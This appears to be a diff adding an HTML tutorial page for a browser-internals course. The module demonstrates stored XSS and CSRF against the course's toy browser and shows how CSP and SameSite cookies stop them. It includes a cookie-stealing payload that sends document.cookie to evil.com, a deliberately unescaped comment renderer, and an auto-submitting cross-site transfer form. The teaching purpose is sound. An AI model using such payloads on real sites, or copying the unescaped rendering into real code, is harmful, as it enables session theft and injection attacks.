@@ -1,0 +1,218 @@
+<title>Module 32: xss_csrf_on_toy_browser — Everything You Built, Actually Tested</title>
+<link rel="stylesheet" href="../../../assets/design-system.css">
+<style>body{--accent:#d64f4f;--accent-dim:#471c1c;}</style>
+
+<div class="page">
+  <span class="module-badge">TRACK 2 · PHASE 10 · MODULE 32 · FIRST ATTACK-SURFACE MODULE</span>
+  <h1>xss_csrf_on_toy_browser</h1>
+  <p style="color:var(--fg-dim); margin-top:-0.8rem;">
+    Proves: a real XSS payload and a real CSRF attack both succeed
+    against this course's own toy browser stack — until the specific
+    defensive module (CSP, SameSite) already built in Phase 9 is
+    actually wired in, at which point they fail, with no other change.
+  </p>
+
+  <h2><span class="num">00</span>Prerequisites</h2>
+  <div class="tag-links">
+    <a class="tag-link" href="../../phase9_policy_layer/30_csp_enforcement/tutorial.html">Module 30: csp_enforcement</a>
+    <a class="tag-link" href="../../phase9_policy_layer/29_cookies_samesite/tutorial.html">Module 29: cookies_samesite</a>
+    <a class="tag-link" href="../../phase6_parsing_dom/20_dom_tree_builder/tutorial.html">Module 20: dom_tree_builder</a>
+  </div>
+
+  <h2><span class="num">01</span>The Big Analogy</h2>
+  <div class="analogy-box">
+    A fire drill doesn't just describe what smoke does — it sets a real
+    (controlled, contained) fire and watches whether the alarm actually
+    triggers and the sprinklers actually engage. Anyone can assert "the
+    sprinkler system works." A real drill proves it, on this specific
+    building, with this specific fire, and it's the only way to know
+    the answer for certain rather than trusting the building's blueprint.
+    This module is that drill: two real, well-understood attacks, run
+    against the specific toy building this course spent 31 modules
+    constructing, checked against its actual, already-installed
+    sprinklers — not a different building, not a hypothetical one.
+  </div>
+
+  <h2><span class="num">02</span>What Happens, Step by Step</h2>
+  <ol class="steps">
+    <li><strong>XSS:</strong> a comment containing a real
+    <code>&lt;script&gt;</code> payload is inserted into a page via
+    naive string concatenation — the actual, common root cause of real
+    stored-XSS vulnerabilities.</li>
+    <li>That page's HTML is fed through this course's OWN tokenizer and
+    DOM builder (Modules 19–20) — proving the injected script is a
+    real, structural <code>&lt;script&gt;</code> element in the parsed
+    DOM, not just suspicious-looking text.</li>
+    <li>With no CSP header, Module 30's own <code>check_script()</code>
+    confirms that script would run. With a real
+    <code>script-src 'self'</code> policy applied, the identical script
+    is confirmed blocked.</li>
+    <li><strong>CSRF:</strong> a hidden, auto-submitting cross-site form
+    targets a toy bank's transfer endpoint.</li>
+    <li>Module 29's own real <code>CookieJar</code> decides whether the
+    victim's session cookie is attached — <code>SameSite=None</code>
+    attaches it (transfer succeeds); <code>SameSite=Lax</code> doesn't
+    (transfer rejected).</li>
+  </ol>
+
+  <h2><span class="num">03</span>What We Actually Captured</h2>
+  <div class="diagram-box">
+<pre>=== Step 2: this HTML really does parse into a <script> DOM node ===
+  <script> elements found in the real, parsed DOM: 1
+    injected script content: 'fetch("https://evil.com/steal?c=" + document.cookie)'
+
+=== Step 3a: BEFORE -- no CSP header at all ===
+  inline script ALLOWED -- no script-src or default-src directive present at all
+  Would this script actually run in a real browser? True
+
+=== Step 3b: AFTER -- a real CSP policy is added, with no 'unsafe-inline' ===
+  inline script BLOCKED -- not permitted by script-src ["'self'"]
+  Would this script actually run in a real browser? False
+
+--- CSRF, BEFORE: SameSite=None ---
+Cookies attached to cross-site POST: ['session']
+Bank server's response: SUCCESS: transferred $500 to attacker.
+
+--- CSRF, AFTER: SameSite=Lax ---
+Cookies attached to cross-site POST: []
+Bank server's response: REJECTED: no valid session cookie attached</pre>
+  </div>
+  <div class="diagram-caption">
+    Real, captured output from both attacks, both defenses — including
+    a real bug this exact testing caught in Module 30's own code (see
+    <code>DECISIONS.md</code>).
+  </div>
+
+  <h2><span class="num">04</span>The Code, Explained</h2>
+  <pre><code>def render_comment_page_VULNERABLE(comments: list) -> str:
+    items = "".join(f"<li>{comment}</li>" for comment in comments)
+    return f"<div class=\"comments\"><ul>{items}</ul></div>"</code></pre>
+  <p>
+    That's the entire vulnerability — one f-string with zero escaping.
+    No clever trick, no obscure edge case: this is genuinely how a huge
+    share of real-world stored-XSS bugs happen, and this module doesn't
+    dramatize it into something more exotic than it actually is.
+  </p>
+
+  <h2><span class="num">05</span>Limits / What You Cannot Do Yet</h2>
+  <div class="compare-box">
+    <div class="compare-col cant">
+      <h4>CAN'T DO YET</h4>
+      <ul>
+        <li>Actually execute the injected script anywhere — this
+        course's JS engine (Modules 25–28) is never invoked on it; the
+        payload is data throughout, proven structurally, never run</li>
+        <li>Defend against CSRF with a token-based mechanism — the toy
+        bank deliberately has none, isolating the cookie/SameSite
+        defense specifically</li>
+      </ul>
+    </div>
+    <div class="compare-col can">
+      <h4>CAN DO NOW</h4>
+      <ul>
+        <li>Explain, with a real before/after run against real code,
+        exactly how CSP stops an already-successful injection from
+        executing</li>
+        <li>Explain exactly why CSRF depends on SameSite cookie
+        behavior, with a real transfer that succeeds and then fails</li>
+        <li>Recognize the classic, textbook shape of both attack classes
+        on sight</li>
+      </ul>
+    </div>
+  </div>
+
+  <h2><span class="num">06</span>Run It</h2>
+  <pre><code>cd track2-applied-layer/phase10_attack_surface/32_xss_csrf_on_toy_browser
+python run_attack_demo.py</code></pre>
+
+  <div class="callout">
+    If the "BEFORE" XSS case shows <code>BLOCKED</code> instead of
+    <code>ALLOWED</code>: you may be looking at output from before this
+    module's testing caught and fixed a real bug in Module 30's
+    <code>check_script()</code> (it originally treated "no CSP header"
+    the same as "an empty allowlist"). Both this module's copy and
+    Module 30's original file were corrected — see
+    <code>DECISIONS.md</code> for the full account.
+  </div>
+
+  <h2><span class="num">07</span>Brain Exercise</h2>
+  <details class="brain-exercise">
+    <summary>
+      This module's CSP fix (Module 30) stops the XSS payload from
+      EXECUTING. Does it do anything about the underlying bug — that
+      user comments are inserted into the page with no escaping at all?
+      If a real site shipped ONLY the CSP fix and never fixed the
+      escaping, what's still genuinely broken? Think it through before
+      revealing the answer.
+    </summary>
+    <div class="answer">
+      The escaping bug is still completely present — CSP never touches
+      it. A real attacker's `<script>` tag would still get inserted
+      into the page's actual HTML structure exactly as before; CSP only
+      stops the BROWSER from executing script content it finds there.
+      This has real, concrete consequences beyond script execution: the
+      injected markup can still corrupt the page's LAYOUT (an unclosed
+      tag, an injected `<style>` block if `style-src` also allows
+      unsafe-inline, or simply visually confusing content appearing
+      where a legitimate comment should be) — none of which requires
+      script execution at all. This is exactly why CSP is correctly
+      described as defense-in-depth, not a fix: it's a real, valuable
+      SECOND layer that specifically blunts the most dangerous
+      consequence (arbitrary code execution) of an XSS bug, while the
+      actual root cause (unescaped output) remains a real bug deserving
+      its own, separate fix.
+    </div>
+  </details>
+
+  <h2><span class="num">08</span>There Are No Dumb Questions</h2>
+  <dl class="qa">
+    <dt>Is `document.cookie` in the payload actually being read by
+    anything in this demo?</dt>
+    <dd>No — it's a string, sitting inside a `Text` node, inside a
+    `<script>` `Element` node, in a plain Python data structure. No
+    JavaScript engine anywhere in this module ever parses or evaluates
+    it as code; it's used purely as realistic-looking DATA to make the
+    demonstration concrete.</dd>
+
+    <dt>Why does the CSRF demo use a form POST instead of, say, a
+    fetch() call from evil.com's JavaScript?</dt>
+    <dd>Because a plain `fetch()` from a different origin would be
+    subject to Module 17/18's Same-Origin Policy and CORS — the
+    response would be blocked from being READ by evil.com's script,
+    which might make it look like the attack "failed." But that's not
+    what actually matters for CSRF: the attacker doesn't need to READ
+    the bank's response, only to cause the SIDE EFFECT (the transfer)
+    to happen. A form POST navigation is the classic vector specifically
+    because it doesn't need to read anything back — it just needs the
+    request to be sent with valid credentials attached.</dd>
+
+    <dt>What did the real bug in Module 30 actually look like, concretely?</dt>
+    <dd>`policy.get("script-src", policy.get("default-src", []))` on an
+    EMPTY dict (`{}`, representing "no CSP header sent") evaluates to
+    `[]` — the exact same result as a policy that explicitly restricts
+    scripts to nothing. The fix explicitly checks whether either key
+    exists in the dict at all before deciding "restricted" vs.
+    "unrestricted by default." A subtle, real, and instructive
+    difference between "absent" and "present-but-empty."</dd>
+
+    <dt>Would a real browser actually let this exact inline script run
+    with no CSP header?</dt>
+    <dd>Yes — this module's claim matches real browser behavior
+    directly: with no `Content-Security-Policy` header at all, there is
+    no restriction on inline scripts whatsoever, and a real browser
+    would execute this payload exactly as written.</dd>
+  </dl>
+
+  <h2><span class="num">09</span>What's Next</h2>
+  <p>
+    Module 33 runs two more real attacks — clickjacking, which exploits
+    the compositor/paint model (Module 24) directly, and UXSS, which
+    exploits a gap in the site-isolation model (Module 11) — against
+    this same toy stack.
+  </p>
+
+  <div class="module-footer">
+    <a href="../../phase9_policy_layer/31_mixed_content_hsts/tutorial.html">← Module 31: mixed_content_hsts</a>
+    <a href="../33_clickjacking_uxss/tutorial.html">Module 33: clickjacking_uxss →</a>
+  </div>
+</div>
